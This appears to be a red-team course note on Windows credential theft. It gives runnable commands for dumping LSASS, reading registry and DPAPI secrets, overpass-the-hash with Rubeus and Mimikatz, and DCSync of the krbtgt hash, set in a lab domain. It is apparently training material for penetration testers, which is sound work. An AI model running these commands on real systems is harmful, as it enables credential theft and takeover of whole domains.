# 6.2 - Credentials Extraction & Mimikatz

## LSA & LSASS

The **Local Security Authority (LSA)** is a key component of the Windows security subsystem responsible for enforcing security policies, managing authentication, and storing sensitive data like user credentials and security tokens. It plays a crucial role in handling authentication requests, verifying user identities, and interacting with Active Directory in domain environments.

The **Local Security Authority Subsystem Service (LSASS)** is the process (`lsass.exe`) that runs LSA in user mode. It is responsible for authenticating users, managing access tokens, and storing credential hashes in memory. Due to its critical role, LSASS is a high-value target for attackers seeking to extract credentials, perform pass-the-hash attacks, or manipulate authentication mechanisms. Protecting LSASS is essential for maintaining system security, which is why modern Windows versions implement protections like Credential Guard and LSASS memory restrictions.

### Extract Credentials without LSASS

This is a stealthier approach compared to direct LSASS dumping, and can be done using:

* SAM hive (Registry) - Local credentials
* LSA Secrets / Security Hive (Registry) - Service account passwords, domain cached credentials
* DPAPI Protected Credentials (Disk) - Credentials Manager / Vault, Browser Cookies, Certificates and Azure Tokens.

#### Mimikatz

[**Mimikatz**](https://github.com/gentilkiwi/mimikatz) is a powerful tool used for credential dumping, ticket extraction, and various attacks against Windows authentication mechanisms. **Invoke-Mimikatz** is a PowerShell-based version that leverages **ReflectivePEInjection** to load Mimikatz directly into memory, avoiding the need for writing files to disk. This makes it stealthier than traditional methods.

Running **Invoke-Mimikatz** requires administrative privileges, and some attacks need additional privileges, which will be discussed in their respective sections.

## Extracting Credentials from LSASS

{% hint style="info" %}
You **need admin access** on a machine.
{% endhint %}

### Mimikatz

To dump credentials (eg. NTLM hash, AES) from **LSASS** on a local machine using **Invoke-Mimikatz**, run:

```powershell
Invoke-Mimikatz -Command "sekurlsa::ekeys"
```

### SafetyKatz

SafetyKatz is a minidump-based approach combined with **PELoader** to execute Mimikatz:

```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```

### SharpKatz

SharpKatz is a C# implementation of certain Mimikatz functionalities:

```powershell
SharpKatz.exe --Command ekeys
```

### Dumpert (Direct System Calls & API Unhooking)

Dumpert evades traditional monitoring by leveraging direct system calls:

```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

### Pypykatz (Python-based Mimikatz Alternative)

For extracting credentials using Python:

```powershell
pypykatz.exe live lsa
```

### Comsvcs.dll for LSASS Dump

A built-in Windows DLL can be leveraged to dump LSASS memory:

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dmp full
```

### Remote Credential Dumping

From a **Linux** machine, you can use:

* **Impacket** for remote credential extraction.
* **Physmem2profit** for memory analysis and credential retrieval.

***

After exactring credentials we can use: Pass-the-Hash / Pass-the-Ticket / OverPass-The-Hash

## OverPass-The-Hash (Pass-the-Key)

OverPass-The-Hash (OPTH) that allows attackers to generate authentication tokens from NTLM hashes or Kerberos keys. It needs administrator right using Mimi/Safety-Katz and no elevation using Rubeus.

In the case of Pass-The-Hash it's necessary to read NTLM hash and use it to authenticate 'as a password' using local users credentials (eg. local administrator of machine), while OverPass-The-Hash uses NTLM or AES Key to obtain TGT Kerberos and authenticate on the system using domain users credentials (usually spawning a new powershell session).

### Invoke-Mimikatz

To perform OPTH with **AES256 encryption**:

```powershell
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"
```

### SafetyKatz

```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe"
```

This starts a PowerShell session with **logon type 9** (equivalent to `runas /netonly`).

### Rubeus (Kerberos-focused Attack)

For OPTH using **NTLM hashes** **(doesnâ€™t require elevation)**:

```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

For OPTH with **AES256 encryption** **(requires elevation)**:

```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

***

## DCSync Attack (Extracting Credentials from the Domain Controller)

DCSync allows an attacker to extract password hashes from a Domain Controller **without executing code on it**.&#x20;

### Mimikatz

#### Extracting the krbtgt Hash

To obtain the **krbtgt** hash using DCSync (requires **Domain Admin privileges**):

```powershell
Invoke-Mimikatz -Command "lsadump::dcsync /user:us\krbtgt"
```

### **SafetyKatz**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt"
```

By default, **Domain Admins**, **Enterprise Admins** or **Domain Controller privileges** are required to execute this attack.
